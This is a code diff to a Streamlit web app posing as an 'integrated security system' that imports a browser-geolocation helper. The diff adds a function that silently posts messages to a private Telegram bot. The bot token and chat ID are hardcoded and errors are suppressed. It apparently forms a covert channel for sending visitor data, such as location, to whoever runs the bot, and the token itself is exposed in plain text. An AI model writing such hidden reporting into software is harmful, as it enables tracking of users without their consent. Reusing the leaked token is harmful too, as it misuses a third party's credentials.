@@ -1,6 +1,17 @@
 import streamlit as st
 import time
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
+import requests
+
+def enviar_telegram(mensagem):
+    token = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
+    chat_id = "8210828398"
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    payload = {"chat_id": chat_id, "text": mensagem, "parse_mode": "Markdown"}
+    try:
+        requests.post(url, json=payload)
+    except:
+        pass
 
 # Configuração da página
 st.set_page_config(page_title="SISTEMA DE SEGURANÇA INTEGRADO",page_icon="🔐",layout="centered")
